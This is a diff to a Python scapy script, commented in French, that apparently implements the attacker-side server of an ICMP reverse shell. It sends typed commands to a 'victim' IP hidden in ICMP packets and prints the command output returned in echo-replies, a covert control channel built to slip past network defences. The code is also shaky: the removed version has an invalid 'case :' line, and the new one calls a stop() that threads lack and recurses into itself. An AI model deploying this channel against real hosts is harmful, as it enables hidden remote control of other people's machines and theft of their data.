@@ -39,33 +39,22 @@ class Server:
         self.victim = victim_ip
         self.ID = packet_id
         self.TTL = 64
+        self.icmp_sniffer = threading.Thread(target=sniff, kwargs={'prn':self.filter, 'store':False, 'filter':'icmp'})
+        self.icmp_sniffer.start()
 
     def main(self):
         """
         Méthode de classe qui aura pour but d'initialiser l'audit du traffic
-        On utilisera un sniffer asynchrone (https://scapy.readthedocs.io/en/latest/usage.html)
-        afin d'avoir une I/O non-bloquante.
+        On utilisera un sniffer à l'interieur d'un Thread (https://scapy.readthedocs.io/en/latest/usage.html)
         """
-
-        icmp_sniffer = threading.Thread(target=sniff, kwargs={'prn': self.filter,'store': False, 'filter': 'icmp'})
-        icmp_sniffer.start()
-
-        while True:
-            data = input(f"[{self.victim}]>")
-            match data:
-
-                case "exit":
-                    print(f"[{self.victim}]Connection Closed")
-                    break
-
-                case :
-                    # On crée une charge utile que l'on enverra par la suite
-                    payload = (IP(dst=self.victim, ttl=self.TTL) / ICMP(type=8, id=self.ID) / Raw(load=data))
-                    # Envoi de la charge utile
-                    sr(payload, timeout=0, verbose=0)
-
-                case _:
-                    pass
+        data = input(f"[{self.victim}]>")
+        
+        if data and data != "exit":
+            send(IP(dst=self.victim, ttl=self.TTL) / ICMP(type=0, id=self.ID) / data, verbose=0)
+            
+        elif data and data == "exit":
+            self.icmp_sniffer.stop()
+            exit()
 
     def filter(self, packet):
         """
@@ -77,10 +66,14 @@ class Server:
         -echo-reply (type 0)
         -echo-request (code 8)
         """
-
         if packet[IP].src == self.victim and packet[ICMP].type == 0 and packet[ICMP].id == self.ID and packet[Raw].load:
-            data = (packet[Raw].load).decode('utf-8', errors='ignore').replace('\n', '')
-            print(data)
+            data = (packet[Raw].load)
+            print(data.decode('cp850'))
+            
+            # /!\ A ne jamais faire /!\
+            # On effectue un rebouclage sur la méthode principale
+            # ici je n'ai pas trouvé d'autres solutions qu'en rebouclant sinon on reste dans une boucle infinie
+            self.main()
 
 
 if __name__ == "__main__":
